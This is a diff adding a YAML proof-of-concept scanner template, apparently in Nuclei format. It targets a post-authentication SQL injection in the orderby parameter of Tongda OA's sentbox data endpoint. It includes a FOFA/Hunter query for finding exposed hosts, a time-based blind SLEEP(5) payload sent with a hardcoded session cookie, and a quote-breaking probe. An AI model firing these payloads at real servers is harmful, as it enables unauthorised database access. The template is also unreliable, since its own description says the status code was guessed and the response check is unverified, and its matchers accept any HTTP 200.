@@ -1,0 +1,56 @@
+id: poc-9e65b2494c53eb42d3ae
+info:
+  name: 通达OAorderby存在后台SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/9e65b2494c53eb42d3aec80068f02011
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 9e65b2494c53eb42d3aec80068f02011
+    fofa: + hunter`app.name="通达 OA"`
+http:
+- raw:
+  - 'GET /general/email/sentbox/get_index_data.php?asc=0&boxid=&boxname=sentbox&curnum=3&emailtype=ALLMAIL&keyword=sample%40email.tst&orderby=-@%60%27%60%20%20AND%20%28SELECT%205386%20FROM%20%28SELECT%28SLEEP%285%29%29%29rmup%29--%20%27%20&pagelimit=20&tag=&timestamp=1598069133&total= HTTP/1.1
+
+    X-Requested-With: XMLHttpRequest
+
+    Cookie: PHPSESSID=4ab8fc42eada7ef077256c00e68e6e8e
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    Accept-Encoding: gzip,deflate
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /general/email/sentbox/get_index_data.php?asc=0&boxid=&boxname=sentbox&curnum=3&emailtype=ALLMAIL&keyword=sample%40email.tst&orderby=-@`''`%20&pagelimit=20&tag=&timestamp=1598069133&total= HTTP/1.1
+
+    X-Requested-With: XMLHttpRequest
+
+    Cookie: {cookie}
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    Accept-Encoding: gzip,deflate
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
